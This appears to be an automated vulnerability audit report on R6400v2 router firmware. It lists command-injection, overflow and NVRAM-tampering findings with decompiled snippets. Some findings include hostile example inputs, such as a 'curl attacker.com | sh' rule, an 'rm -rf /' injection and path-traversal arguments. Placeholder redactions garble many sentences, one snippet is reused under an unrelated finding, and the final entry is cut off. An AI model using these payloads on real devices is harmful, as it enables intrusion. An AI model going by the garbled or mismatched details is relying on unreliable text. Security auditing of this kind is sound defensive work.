# R6400v2-V1.0.2.46_1.0.36 (44 alerts)

---

### command_execution-bd-RCE_8083

- **File/Directory Path:** `sbin/bd`
- **Location:** `bd:0xb1cc FUN_0000b1cc`
- **Risk Score:** 10.0
- **Confidence:** 9.25
- **Description:** The program creates a listening service on port 8083 and directly executes the content of the QUERY_STRING environment variable upon accepting a connection. REDACTED_PASSWORD_PLACEHOLDER vulnerability points: 1) External input is obtained via getenv('QUERY_STRING') 2) It is passed directly to system() for execution without any REDACTED_PASSWORD_PLACEHOLDER 3) Attackers can inject arbitrary commands by setting QUERY_STRING in HTTP requests. Trigger condition: Network accessibility to port 8083 + sending a request containing a malicious QUERY_STRING. Actual impact: Remote Code Execution (RCE), extremely high risk level.
- **Code Snippet:**
  ```
  pcVar8 = getenv("QUERY_STRING");
  if (pcVar8 != (char *)0x0) {
      system(pcVar8);
  }
  ```
- **Keywords:** QUERY_STRING, system, getenv, FUN_0000b1cc, socket, bind, accept
- **Notes:** Verification required: 1) Whether bd starts automatically on boot 2) Exposure status of port 8083 3) Associated HTTP service processing flow. Subsequent recommendation: Analyze relevant startup scripts in /etc/init.d/. Note: The knowledge base already contains findings regarding www/cgi-bin/genie.cgi using QUERY_STRING (risk level 7.5), but it's in a different file and only involves authentication bypass, with no direct correlation established.

---
### command_injection-acos_service-lan_ipaddr

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `acos_service:main @ 0xd054`
- **Risk Score:** 9.8
- **Confidence:** 9.25
- **Description:** High-risk command injection vulnerability: When the program executes with the 'start' parameter and NVRAM configuration 'afpd_enable=1', the unvalidated NVRAM value 'lan_ipaddr' is concatenated into a system command via sprintf() and directly executed via system(). Attackers can inject arbitrary commands by setting tainted values (e.g., '127.0.0.1;rm -rf /'). Trigger conditions: 1) Attackers write tainted data through HTTP interfaces or similar 2) The service executes network initialization procedures. Absence of input filtering or boundary checks leads to arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges.
- **Code Snippet:**
  ```
  uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);
  sym.imp.sprintf(iVar24 + -0x1e8,*0xccfc,*0xccf8,uVar11);
  sym.imp.system(iVar24 + -0x1e8);
  ```
- **Keywords:** lan_ipaddr, afpd_enable, acosNvramConfig_get, system, sprintf, *0xcd64, *0xccfc
- **Notes:** The complete attack chain has been verified: HTTP interface → NVRAM settings → command execution. Forms an exploitation chain with Discovery 3.

---
### attack_chain-http_to_command

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `unknown`
- **Risk Score:** 9.5
- **Confidence:** 9.0
- **Description:** Feasibility verification of attack chain: Confirming the complete path from HTTP interface to command injection: 1) Attacker sets tainted NVRAM (lan_ipaddr) 2) acos_service starts reading tainted value 3) Value directly concatenated into system() command 4) Injected command executes as REDACTED_PASSWORD_PLACEHOLDER. REDACTED_PASSWORD_PLACEHOLDER trigger point located in network initialization section of main(), with high success rate of exploitation.
- **Keywords:** HTTP_interface, NVRAM_set, acosNvramConfig_get, system, command_injection
- **Notes:** Forms a complete exploitation chain with Discovery 1. It is recommended to analyze the web components under /cgi-bin/ in subsequent steps to verify the NVRAM write interface.

---
### network_input-pppd_PAP_auth-stack_overflow

- **File/Directory Path:** `sbin/pppd`
- **Location:** `sbin/pppd: sym.upap_authwithpeer (HIDDEN)`
- **Risk Score:** 9.5
- **Confidence:** 8.75
- **Description:** PAP Authentication Stack Buffer Overflow Vulnerability (CVE pending): Triggered when an attacker sends an excessively long PAP REDACTED_PASSWORD_PLACEHOLDER via PPP connection. The vulnerability resides in the sym.upap_authwithpeer function: 1) REDACTED_PASSWORD_PLACEHOLDER length (param_3) is not validated 2) Copied via memcpy into a fixed 24-byte stack buffer 3) Return address overwritten when combined REDACTED_PASSWORD_PLACEHOLDER exceeds 15 bytes. Since pppd runs with REDACTED_PASSWORD_PLACEHOLDER privileges, successful exploitation could lead to complete device compromise.
- **Code Snippet:**
  ```
  memcpy(puVar9 + iVar3 + 1, puVar5[3], puVar5[4]); // puVar5[3]=HIDDEN, puVar5[4]=HIDDEN
  ```
- **Keywords:** sym.upap_authwithpeer, param_3, auStack_18, memcpy, PAP authentication, puVar5[4]
- **Notes:** Pending further verification: 1) Exact overflow offset 2) Feasibility of ASLR/PIE bypass 3) Input filtering mechanism of the associated configuration file REDACTED_PASSWORD_PLACEHOLDER

---
### command_injection-rc-0x0000efd0

- **File/Directory Path:** `sbin/rc`
- **Location:** `rc:0x0000efd0`
- **Risk Score:** 9.5
- **Confidence:** 8.0
- **Description:** High-risk command injection vulnerability: Function fcn.0000ed80 (0x0000efd0) in rc executes commands pointed to by global pointers *0xfd88/*0xfd8c via system(). Trigger condition: When nvram_get(*0xfd80) returns empty or strcmp(*0xfd84) mismatches. Critical flaw: The command string is entirely controlled by NVRAM values without validation, allowing attackers to poison inputs via HTTP interface/NVRAM settings to achieve arbitrary command execution.
- **Code Snippet:**
  ```
  if ((iVar2 == 0) || (iVar2 = sym.imp.strcmp(iVar2,*0xfd84), iVar2 != 0)) {
      sym.imp.system(*0xfd88);
      sym.imp.system(*0xfd8c);
  }
  ```
- **Keywords:** system, *0xfd88, *0xfd8c, nvram_get, strcmp, *0xfd80, *0xfd84
- **Notes:** Complete attack path: HTTP parameters → NVRAM configuration interface → triggered during rc startup

---
### nvram_get-ubdcmd-detect

- **File/Directory Path:** `sbin/ubdcmd`
- **Location:** `ubdcmd:0x91cc,0x93d4,0x8d80`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** NVRAM Pollution Attack Chain: Triggering critical vulnerabilities by polluting wan_ipaddr/wan_gateway/pppoe_mtu via HTTP interface. Trigger steps: 1) Set malicious NVRAM values 2) Execute `ubdcmd detect`. Specific manifestations: 1) pppoe_mtu<50 → subl integer underflow at 0x91cc 2) wan_ipaddr pollutes global structure → fcn.00008d80 out-of-bounds read 3) wan_gateway invalid IP → inet_addr failure → infinite loop at 0x8d80. Security impact: Denial of Service/Information Disclosure/Logic Bypass, success probability >80%. Boundary check: acosNvramConfig_get return value used directly without length/content validation.
- **Code Snippet:**
  ```
  ldr r0, =pppoe_mtu
  bl acosNvramConfig_get
  bl atoi
  cmp r0, #50
  subls r0, r0, #1  ; HIDDEN
  ```
- **Keywords:** acosNvramConfig_get, pppoe_mtu, wan_ipaddr, wan_gateway, detect, fcn.00008d80, subls, inet_addr
- **Notes:** REDACTED_PASSWORD_PLACEHOLDER pollution keys: wan_ipaddr (2 chains)/wan_gateway (2 chains)/pppoe_mtu (1 chain); related to acosNvramConfig_get (shared by multiple chains)

---
### command_injection-rc-fcn13974_nvram_eval

- **File/Directory Path:** `sbin/rc`
- **Location:** `rc:0x13c40 (fcn.REDACTED_PASSWORD_PLACEHOLDER)`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** High-risk command injection chain (NVRAM→_eval): In function fcn.REDACTED_PASSWORD_PLACEHOLDER, attacker-controlled NVRAM variables (such as the REDACTED_PASSWORD_PLACEHOLDER corresponding to *0x14910) dynamically construct command parameters through snprintf, ultimately executed by _eval. Specific path: Untrusted input (NVRAM)→Unfiltered parameters→Dynamic command construction→System command execution. Trigger condition: This code segment is automatically triggered during network interface initialization.
- **Code Snippet:**
  ```
  pcVar2 = sym.imp.nvram_get(*0x14910);
  sym.imp.snprintf(..., *0x14958, ...);
  sym.imp._eval(...);
  ```
- **Keywords:** fcn.REDACTED_PASSWORD_PLACEHOLDER, _eval, nvram_get, snprintf, *0x14910, *0x14958
- **Notes:** The complete attack chain requires analyzing NVRAM write points in conjunction with HTTP interfaces; related knowledge base note: the security of NVRAM write interfaces needs to be verified.

---
### command_injection-hotplug2-rules_manipulation

- **File/Directory Path:** `sbin/hotplug2`
- **Location:** `sbin/hotplug2:0xa8d0 fcn.0000a8d0`
- **Risk Score:** 9.0
- **Confidence:** 8.75
- **Description:** Command injection vulnerability in hotplug2 rules file driver. Trigger conditions: 1) Attacker modifies contents of /etc/hotplug2.rules file 2) Rule contains SYSTEM_ACTION with command containing environment variable placeholders (e.g., $VAR). Vulnerability principle: a) Function fcn.0000a73c performs environment variable substitution without content filtering b) Substitution result is directly passed to system() for execution. Attackers can craft malicious rules (e.g., PATH=/tmp;curl${IFS}attacker.com | sh), achieving RCE when hotplug events trigger the rules. Attack surface: Network interface (if www user has write access to rules file) or physical interface (USB hotplug).
- **Code Snippet:**
  ```
  uVar9 = fcn.0000a73c(uVar5,param_1);
  iVar11 = sym.imp.system();
  ```
- **Keywords:** fcn.0000a73c, system, SYSTEM_ACTION, /etc/hotplug2.rules
- **Notes:** Verify rule file permissions: If the www user has write access to /etc/hotplug2.rules, it forms a complete WEB→configuration tampering→RCE chain. Related knowledge base note: 'Verify whether the configuration file contains user-controllable parameters.'

---
### cmd_injection-frendly_name-system

- **File/Directory Path:** `sbin/system`
- **Location:** `sbin/system:0 (main) 0xcd24`
- **Risk Score:** 9.0
- **Confidence:** 8.75
- **Description:** High-risk command injection vulnerability: The program uses 'sprintf(buffer, "%s %s", "mkdir -p", nvram_get("friendly_name"))' to construct commands, where the 'friendly_name' value is directly concatenated without any filtering. Trigger condition: An attacker sets malicious NVRAM values (e.g., ';reboot;') through other interfaces (such as Web API), which are triggered when the system executes initialization processes. Security impact: Arbitrary commands can be executed with REDACTED_PASSWORD_PLACEHOLDER privileges, with a high probability of successful exploitation.
- **Code Snippet:**
  ```
  uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);
  sym.imp.sprintf(iVar24 + -0x1e8, *0xccfc, *0xccf8, uVar11);
  sym.imp.system(iVar24 + -0x1e8);
  ```
- **Keywords:** friendly_name, acosNvramConfig_get, sprintf, system, mkdir -p
- **Notes:** Associated attack path: Web interface setting friendly_name → NVRAM storage → system() execution

---
### command_injection-rc-lan_ifnames_eval

- **File/Directory Path:** `sbin/rc`
- **Location:** `sbin/rc:0x10c98 (network_init)`
- **Risk Score:** 9.0
- **Confidence:** 8.5
- **Description:** Command injection vulnerability in lan_ifnames: At address 0x10c98, the return value of nvram_get("lan_ifnames") is split and used to construct _eval command arguments. Although strspn/strcspn are used for splitting, REDACTED_PASSWORD_PLACEHOLDER contents are not filtered. Attackers can inject malicious commands by contaminating lan_ifnames. Trigger condition: Executed during system network configuration initialization.
- **Keywords:** lan_ifnames, nvram_get, _eval, strspn, strcspn

---
### cmd_injection-nvram_leafp2p_sys_prefix

- **File/Directory Path:** `etc/init.d/leafp2p.sh`
- **Location:** `etc/init.d/leafp2p.sh:5-6,8,12 (start)`
- **Risk Score:** 9.0
- **Confidence:** 8.25
- **Description:** Attackers can inject malicious paths by tampering with the NVRAM 'leafp2p_sys_prefix' value: 1) SYS_PREFIX is directly used to construct script paths (${SYS_PREFIX}/bin/checkleafnets.sh) 2) PATH is modified to prioritize ${SYS_PREFIX}/bin. Trigger conditions: a) Attackers can write to NVRAM (e.g., via web vulnerabilities) b) Execution of /etc/init.d/leafp2p.sh start. Boundary check: No path validation or filtering. Actual impact: Combined with background execution mechanisms (${CHECK_LEAFNETS} &), it can lead to arbitrary command execution. Exploitation method: Placing a forged checkleafnets.sh in the malicious path to achieve privilege escalation.
- **Code Snippet:**
  ```
  SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)
  PATH=${SYS_PREFIX}/bin:...
  ${CHECK_LEAFNETS} &
  ```
- **Keywords:** leafp2p_sys_prefix, SYS_PREFIX, CHECK_LEAFNETS, checkleafnets.sh, nvram get, PATH, start()
- **Notes:** Verification required: 1) Security of NVRAM write interface 2) Actual implementation of checkleafnets.sh. Subsequent analysis of the NVRAM setting functionality in the web interface is recommended.

---
### stack_overflow-acos_service-nvram_ce30

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `unknown`
- **Risk Score:** 9.0
- **Confidence:** 8.25
- **Description:** High-risk stack overflow vulnerability (dual): 1) NVRAM entry '*0xce30' is written via sprintf(4-byte buffer,"%d",value), where integer conversion can overwrite the return address; 2) NVRAM value '*0xca9c' is copied via strcpy(40-byte buffer,value). Trigger condition: control relevant NVRAM entries and trigger service restart. Complete lack of boundary checking enables arbitrary code execution.
- **Keywords:** sprintf, strcpy, acosNvramConfig_get, atoi, *0xce30, *0xca9c, auStack_1ce8
- **Notes:** nvram_get

---
### cmd_injection-env_nvram_system-fcn1728c

- **File/Directory Path:** `sbin/system`
- **Location:** `fcn.0001728c (0x16024, 0x15d5c)`
- **Risk Score:** 9.0
- **Confidence:** 8.0
- **Description:** High-risk command injection chain: The attacker triggers NVRAM pollution (fcn.0001728c+0x16024) by contaminating environment variables (e.g., HTTP_USER_AGENT). The contaminated NVRAM value is directly concatenated into the sprintf format string at fcn.0001728c+0x15d5c without filtering, ultimately executed via system. Trigger conditions: 1) During network configuration operations 2) Contaminated data contains command separators. Boundary check: No input filtering mechanism, only simple whitespace trimming. Exploitability: High (arbitrary command injection possible).
- **Code Snippet:**
  ```
  iVar7 = sym.imp.getenv(*0x16e84);
  sym.imp.acosNvramConfig_set(*0x16f00,iVar7);
  uVar13 = sym.imp.acosNvramConfig_get(...);
  sym.imp.sprintf(iVar18,*0x15e9c,pcVar10,uVar13);
  sym.imp.system(iVar18);
  ```
- **Keywords:** getenv, acosNvramConfig_set, acosNvramConfig_get, sprintf, system, HTTP_USER_AGENT
- **Notes:** Full attack path: Environment variable pollution → NVRAM storage → Command concatenation → System command execution. It is recommended to verify environment variable setting points in the web interface.

---
### stack_overflow-rc-fcn0ed80_strcpy

- **File/Directory Path:** `sbin/rc`
- **Location:** `rc:0xee8c (fcn.0000ed80)`
- **Risk Score:** 9.0
- **Confidence:** 7.75
- **Description:** Stack overflow risk (NVRAM→strcpy): At address 0xee8c in function fcn.0000ed80, the return value of nvram_get() is directly copied via strcpy to a fixed-size stack buffer (puVar10). An attacker can overwrite the return address by setting an excessively long NVRAM value. Trigger condition: This function is called and the attacker controls the corresponding NVRAM REDACTED_PASSWORD_PLACEHOLDER-value pair.
- **Code Snippet:**
  ```
  uVar3 = sym.imp.nvram_get(*0xfd98);
  sym.imp.strcpy(puVar10, uVar3);
  ```
- **Keywords:** strcpy, nvram_get, fcn.0000ed80, puVar10, *0xfd98
- **Notes:** nvram_get

---
### attack_chain-hotplug_hardware_to_rce

- **File/Directory Path:** `sbin/hotplug`
- **Location:** `HIDDEN: sbin/hotplug → sbin/hotplug2`
- **Risk Score:** 9.0
- **Confidence:** 7.75
- **Description:** Hotplug Attack Path Correlation Analysis: Hardware hotplug events (e.g., USB insertion) may process environment variable inputs (such as $ACTION/$DEVPATH) via '/sbin/hotplug', subsequently triggering '/sbin/hotplug2' to execute rules in '/etc/hotplug2.rules'. The SYSTEM_ACTION commands in these rules contain unfiltered environment variable placeholders (e.g., $VAR), allowing attackers to achieve RCE by tampering with the rule file. Full attack chain: hardware event → hotplug environment variable input → hotplug2 rule parsing → command injection. REDACTED_PASSWORD_PLACEHOLDER constraints: 1) Rule file permissions must be verified (whether writable by the www user); 2) It must be confirmed whether hotplug events pass environment variables to hotplug2.
- **Keywords:** hotplug, hotplug2, ACTION, DEVPATH, SYSTEM_ACTION, /etc/hotplug2.rules
- **Notes:** Associated knowledge base records: 1) sbin/hotplug analysis failed (file unreadable) 2) sbin/hotplug2 command injection vulnerability. Manual verification required: 1) /etc/hotplug2.rules file permissions 2) Whether hotplug events pass input to hotplug2 via environment variables.

---
### exploit-chain-nvram-pollution-leafp2p

- **File/Directory Path:** `etc/init.d/leafp2p.sh`
- **Location:** `etc/init.d/leafp2p.sh:5-12`
- **Risk Score:** 9.0
- **Confidence:** 7.75
- **Description:** Confirm the complete NVRAM pollution attack chain: 1) The attacker sets the leafp2p_sys_prefix NVRAM value through an unauthorized interface (e.g., Web CGI) → 2) The system executes /etc/init.d/leafp2p.sh during startup or service restart → 3) The script reads the polluted value via `SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)` → 4) The polluted value is directly injected into the PATH environment variable and CHECK_LEAFNETS execution path → 5) When `${CHECK_LEAFNETS} &` is executed, the attacker-controlled malicious script runs. Trigger conditions: a) NVRAM write permissions b) Deployment of a malicious checkleafnets.sh in the polluted path c) Service startup event.
- **Code Snippet:**
  ```
  SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)
  PATH=${SYS_PREFIX}/bin:...
  CHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh
  start() {
      ${CHECK_LEAFNETS} &
  ```
- **Keywords:** leafp2p_sys_prefix, nvram get, SYS_PREFIX, PATH, CHECK_LEAFNETS, checkleafnets.sh, start()
- **Notes:** REDACTED_PASSWORD_PLACEHOLDER unverified points: 1) Specific location of NVRAM write interface 2) Implementation details of checkleafnets.sh. Tool limitations: Unable to verify content of REDACTED_PASSWORD_PLACEHOLDER.sh, NVRAM write point not located. Recommendation: Prioritize analysis of NVRAM operation CGI scripts under /www/cgi-bin, dynamically trace leafp2p_sys_prefix call chain.

---
### ipc-dbus-session-policy

- **File/Directory Path:** `etc/session.conf`
- **Location:** `etc/session.conf`
- **Risk Score:** 8.5
- **Confidence:** 9.5
- **Description:** The D-Bus session configuration has a globally permissive policy: 1) Allows all processes to eavesdrop on bus messages (eavesdrop=true) 2) Permits sending messages to arbitrary destinations (send_destination="*") 3) Sets an excessively large message size limit of 1GB. Attackers could exploit this via malicious processes to monitor sensitive communications (e.g., REDACTED_PASSWORD_PLACEHOLDER exchanges) or inject spoofed messages (e.g., service control commands), potentially forming a complete attack chain when combined with other vulnerabilities. This configuration requires no specific trigger conditions and becomes effective upon system startup.
- **Code Snippet:**
  ```
  <policy context="default">
    <allow send_destination="*" eavesdrop="true"/>
    <allow eavesdrop="true"/>
  </policy>
  <limit name="max_message_size">REDACTED_PASSWORD_PLACEHOLDER</limit>
  ```
- **Keywords:** eavesdrop, send_destination, max_message_size, session.d, session-local.conf, <policy>, <limit>
- **Notes:** Check whether the session.d directory overrides this policy. This configuration significantly expands the attack surface and is recommended to be tracked as a REDACTED_PASSWORD_PLACEHOLDER node in the IPC attack chain.

---
### curl-o-parameter-path-traversal

- **File/Directory Path:** `sbin/curl`
- **Location:** `getparameter:0x0000ff9c, operate_do:0x00011a5c`
- **Risk Score:** 8.5
- **Confidence:** 8.5
- **Description:** The -o parameter in curl is vulnerable to path traversal: in the getparameter function (case 0x4c), the user-provided path is passed directly to fopen64() without any filtering. An attacker can craft a malicious path (e.g., '-o ../../..REDACTED_PASSWORD_PLACEHOLDER') to achieve arbitrary file overwriting. Trigger conditions: 1) The attacker can control curl's command-line parameters 2) The curl process has write permissions to the target path. In a firmware environment, if curl is invoked by a web backend or runs with elevated privileges, this could lead to tampering with critical configuration files or privilege escalation.
- **Code Snippet:**
  ```
  iVar5 = sym.imp.fopen64(*(puVar22 + -0x1c), *0x1226c); // HIDDEN
  ```
- **Keywords:** getparameter, case 0x4c, fopen64, operate_do, -o, output, curl
- **Notes:** Verification in the firmware environment is required: a) whether curl has setuid permissions b) whether any component passes unfiltered user input to curl. Common paths: /usr/bin/curl or /sbin/curl

---
### network_input-ubdcmd-recvmsg

- **File/Directory Path:** `sbin/ubdcmd`
- **Location:** `HIDDEN: 0x8e10,0x8ebc,0x8f40,0x9168,0x9a60`
- **Risk Score:** 8.5
- **Confidence:** 8.5
- **Description:** recvmsg buffer flaw: Hardcoded length of 0x420 when receiving network data without validating the actual length. Trigger condition: Sending a crafted UDP packet with length ≠1056 bytes. Specific manifestations: 1) Five call sites with fixed param_2=0x420. 2) Actual received length not validated → short packets can manipulate memory at *0x8e70+0x26, etc. 3) Long packets trigger stack overflow in fcn.00008f04. Security impact: Memory corruption leading to RCE (can form a complete chain when combined with auto command). Boundary check: Only fcn.00008b98 has param_2≤0x420 check, without validating the actual return value of recvmsg.
- **Code Snippet:**
  ```
  mov r2, #0x420  ; HIDDEN
  bl recvmsg
  ldr r3, [sp, #0x400] ; HIDDEN
  ```
- **Keywords:** recvmsg, param_2, 0x420, fcn.00008b98, fcn.00008f04
- **Notes:** Verify the exposure status of UDP ports; correlate with fcn.00008b98 (manualset integer overflow).

---
### nvram_pollution-rc-0x0000ed80

- **File/Directory Path:** `sbin/rc`
- **Location:** `rc:0x0000ed80`
- **Risk Score:** 8.5
- **Confidence:** 8.5
- **Description:** NVRAM contamination propagation path: fcn.0000ed80 contains 21 nvram_get calls (e.g., *0xfd54, *0xfd80, etc.), directly affecting: 1) branch condition judgments (strcmp), 2) file write content (*0xff08), 3) command execution parameters (*0xfd88). Critical constraint missing: all NVRAM value usage points lack length checks or content filtering, creating a system-level contamination entry point.
- **Keywords:** nvram_get, *0xfd54, *0xfd80, *0xff08, *0xfd88, strcmp

---
### env-pollution-curl-http-proxy

- **File/Directory Path:** `sbin/curl`
- **Location:** `sbin/curl:0x000113f0 sym.operate_do`
- **Risk Score:** 8.5
- **Confidence:** 8.25
- **Description:** HTTP_PROXY environment variable pollution leading to man-in-the-middle attack: 1) The operate_do function reads the HTTP_PROXY environment variable value via curl_getenv 2) Directly configures the proxy through tool_setopt without validation 3) Attackers can force curl traffic through a malicious proxy by polluting environment variables (e.g., via NVRAM/web interface). Trigger conditions: a) Firmware allows remote setting of environment variables b) User executes curl network requests. Actual impact: Sensitive data theft/traffic tampering.
- **Code Snippet:**
  ```
  iVar9 = sym.curl_getenv(*0x12248);
  iVar3 = sym.imp.strdup();
  param_2[0x45] = iVar3;
  ```
- **Keywords:** operate_do, curl_getenv, tool_setopt, CURLOPT_PROXY, HTTP_PROXY
- **Notes:** Associated knowledge base ID: curl-o-parameter-path-traversal/curl-T-parameter-arbitrary-read. Need to verify environment variable setting mechanism, NVRAM interface may be the contamination entry point.

---
### attack_chain-pppd_hotplug2-env_injection

- **File/Directory Path:** `sbin/pppd`
- **Location:** `HIDDEN: sbin/pppd → sbin/hotplug2`
- **Risk Score:** 8.5
- **Confidence:** 6.5
- **Description:** Inter-component environment variable pollution attack chain (to be verified): 1) pppd sets variables like SPEED via script_setenv 2) Variables are passed to /tmp/ppp/ip-up script through /bin/sh 3) If the script fails to filter variable references (e.g., $PATH) and variable values are polluted 4) May trigger SETENV_ACTION/SYSTEM_ACTION vulnerability in hotplug2 component (CVE-XXXX). REDACTED_PASSWORD_PLACEHOLDER verification points: a) Whether SPEED value is controlled by network input b) Whether ip-up script executes commands in '$VAR' format c) Environment variable passing mechanism between processes.
- **Code Snippet:**
  ```
  N/A (HIDDEN)
  ```
- **Keywords:** script_setenv, SETENV_ACTION, SYSTEM_ACTION, /tmp/ppp/ip-up, SPEED, $IFS
- **Notes:** Correlation found: 1) PPPD environment variable injection risk (command_execution-pppd_script_env-injection_risk) 2) Hotplug2 command injection (command_injection-hotplug2-env_pollution). Verification priority: Check the content of the /tmp/ppp/ip-up script.

---
### network_input-remote-web_exposure

- **File/Directory Path:** `etc/init.d/remote.sh`
- **Location:** `etc/init.d/remote.sh:12-19`
- **Risk Score:** 8.0
- **Confidence:** 8.25
- **Description:** The script creates symbolic links to expose files under `REDACTED_PASSWORD_PLACEHOLDER` as web endpoints (e.g., `/tmp/www/cgi-bin/RMT_invite.cgi`). Trigger condition: Automatically enabled when the web server configuration includes the `/tmp/www` path. External HTTP requests can directly access these endpoints, and no input filtering mechanism has been identified, potentially forming a complete attack chain from network input to CGI execution.
- **Code Snippet:**
  ```
  ln -s REDACTED_PASSWORD_PLACEHOLDER_invite.cgi /tmp/www/cgi-bin/RMT_invite.cgi
  ln -s REDACTED_PASSWORD_PLACEHOLDER.sh /tmp/www/cgi-bin/func.sh
  ```
- **Keywords:** ln -s, /tmp/www/cgi-bin/RMT_invite.cgi, REDACTED_PASSWORD_PLACEHOLDER.htm, leafp2p_services
- **Notes:** The actual risk depends on: 1) whether the web server loads /tmp/www, and 2) whether vulnerabilities exist in RMT_invite.cgi/func.sh.

---
### heap_overflow-http_request-fcn000087f0

- **File/Directory Path:** `sbin/htmlget`
- **Location:** `/sbin/htmlget: [fcn.000087f0]`
- **Risk Score:** 8.0
- **Confidence:** 8.25
- **Description:** In function fcn.000087f0, a heap buffer overflow vulnerability exists when constructing an HTTP request using sprintf. The buffer is allocated with malloc(0x46) for 70 bytes, while the hardcoded request template 'GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Linux C 1.0\r\nAccept: */*\r\n\r\n' combined with a 15-byte IP address generates a 71-byte output. The program fails to validate the length of the IP address resolved by gethostbyname, resulting in a single-byte heap overflow. Trigger condition: An attacker can force a 15-byte IPv4 address resolution (e.g., 192.168.100.100) through DNS spoofing. Actual impact: May corrupt heap metadata leading to denial of service or remote code execution, depending on the firmware's heap allocator (e.g., dlmalloc) and memory layout.
- **Code Snippet:**
  ```
  iVar4 = sym.imp.malloc(0x46);
  sym.imp.sprintf(iVar4,*0x8acc,*0x8abc,*0x8ad0);
  ```
- **Keywords:** sprintf, malloc, gethostbyname, inet_ntop, hostname, fcn.000087f0
- **Notes:** The vulnerability relies on DNS spoofing for triggering. It is necessary to verify the behavior of the firmware's heap allocator (e.g., dlmalloc) to assess exploitability. Related file: libc shared library (heap management implementation).

---
### network_input-http_header_oob_write-fcn_REDACTED_PASSWORD_PLACEHOLDER

- **File/Directory Path:** `www/cgi-bin/genie.cgi`
- **Location:** `genie.cgi:0 (fcn.REDACTED_PASSWORD_PLACEHOLDER)`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** HTTP Response Header Overflow Vulnerability: Triggered when an attacker-controlled malicious server returns response headers ≥2048 bytes. The vulnerability resides in the response header processing logic at fcn.REDACTED_PASSWORD_PLACEHOLDER: strncpy copies data followed by manual null-byte termination without verifying destination buffer boundaries. This results in a single null byte (0x00) being written beyond the stack buffer. Trigger condition: The device initiates an HTTP request to an attacker-controlled server. Actual impact: May corrupt stack structure leading to program crashes or arbitrary code execution (requires specific stack layout).
- **Keywords:** fcn.REDACTED_PASSWORD_PLACEHOLDER, strncpy, X-Error-Code, X-Error-Message, fp-0x58, var_24h
- **Notes:** Verify the actual firmware's curl response header length limit and specific stack layout architecture.

---
### symlink_risk-RMT_invite

- **File/Directory Path:** `sbin/system`
- **Location:** `etc/init.d/remote.sh:12 (script) 0x0`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** Symbolic Link Security Risk: The use of 'ln -s' in /etc/init.d/remote.sh to create CGI script links does not validate the target path. Trigger Condition: An attacker pre-creates a malicious symbolic link. Security Impact: When the web server accesses /tmp/www/cgi-bin/RMT_invite.cgi, it may lead to arbitrary code execution.
- **Code Snippet:**
  ```
  ln -s REDACTED_PASSWORD_PLACEHOLDER_invite.cgi /tmp/www/cgi-bin/RMT_invite.cgi
  ```
- **Keywords:** ln, /tmp/www/cgi-bin/RMT_invite.cgi, leafp2p_services, remote.sh
- **Notes:** It is necessary to verify the actual call chain in conjunction with leafp2p_services

---
### configuration_load-readydropd-external_usb_admin_chain

- **File/Directory Path:** `www/cgi-bin/readydropd.conf`
- **Location:** `www/cgi-bin/readydropd.conf`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** configuration_load specifies an external USB mount path as the home_dir (/tmp/mnt/usb0/part1). When a malicious USB device is connected, attackers can influence service behavior through file implantation or path traversal. Combined with the high privileges of httpd_user=REDACTED_PASSWORD_PLACEHOLDER, this could form an attack chain of 'external media input → path traversal → privilege escalation'. Trigger condition: inserting a malicious USB device and inducing the service to access a specific path.
- **Code Snippet:**
  ```
  home_dir = /tmp/mnt/usb0/part1
  httpd_user = REDACTED_PASSWORD_PLACEHOLDER
  ```
- **Keywords:** home_dir, /tmp/mnt/usb0/part1, httpd_user, REDACTED_PASSWORD_PLACEHOLDER
- **Notes:** Verify the handling logic of the home_dir by the readydropd main program (recommend analyzing the www/cgi-bin/readydropd binary file)

---
### command_injection-hotplug2-env_pollution

- **File/Directory Path:** `sbin/hotplug2`
- **Location:** `sbin/hotplug2:0xad60`
- **Risk Score:** 8.0
- **Confidence:** 7.75
- **Description:** Second-order command injection caused by environment variable pollution. Trigger conditions: 1) The rule file contains SETENV_ACTION followed by a SYSTEM_ACTION sequence 2) The SYSTEM_ACTION command references variables set by SETENV. Vulnerability principle: a) SETENV_ACTION directly uses rule data to set environment variables b) During SYSTEM_ACTION execution, the shell resolves $ variable references. Attackers can construct: SETENV_ACTION sets 'PATH=/tmp;' then executes '$IFS$PATH/sh' to achieve injection. Actual risk depends on hotplug event frequency and environment variable controllability (e.g., via malicious USB devices).
- **Code Snippet:**
  ```
  case 0xb: setenv(**(iVar12+4), (*(iVar12+4))[1], 1);
  case 0: system(fcn.0000a73c(**(iVar12+4), param_1));
  ```
- **Keywords:** SETENV_ACTION, SYSTEM_ACTION, setenv, $IFS
- **Notes:** Dynamic testing is required to assess the controllability of environment variables during USB hot-plug events. Shares the pollution point fcn.0000a73c with Discovery 1.

---
### config_tamper-rc-0x0000ee20

- **File/Directory Path:** `sbin/rc`
- **Location:** `rc:0x0000ee20`
- **Risk Score:** 8.0
- **Confidence:** 7.5
- **Description:** File Write Vulnerability: At fcn.0000ed80 (0x0000ee20), a file at path *0xff30 is opened in write mode via fopen, and 23 bytes of content controlled by *0xff08 are written. Trigger condition: nvram_get(*0xfd54) returns a specific value followed by a successful strcmp match. Vulnerability point: The written content is entirely controlled by NVRAM without validation, potentially allowing malicious overwriting of critical configurations.
- **Code Snippet:**
  ```
  iVar2 = sym.imp.fopen(*0xff30,*0xff34);
  sym.imp.fwrite(*0xff08,1,0x23,iVar2);
  ```
- **Keywords:** fopen, fwrite, *0xff30, *0xff08, nvram_get, *0xfd54

---
### buffer_overflow-env_path_concatenation-fcn17360

- **File/Directory Path:** `sbin/system`
- **Location:** `fcn.REDACTED_PASSWORD_PLACEHOLDER`
- **Risk Score:** 8.0
- **Confidence:** 7.0
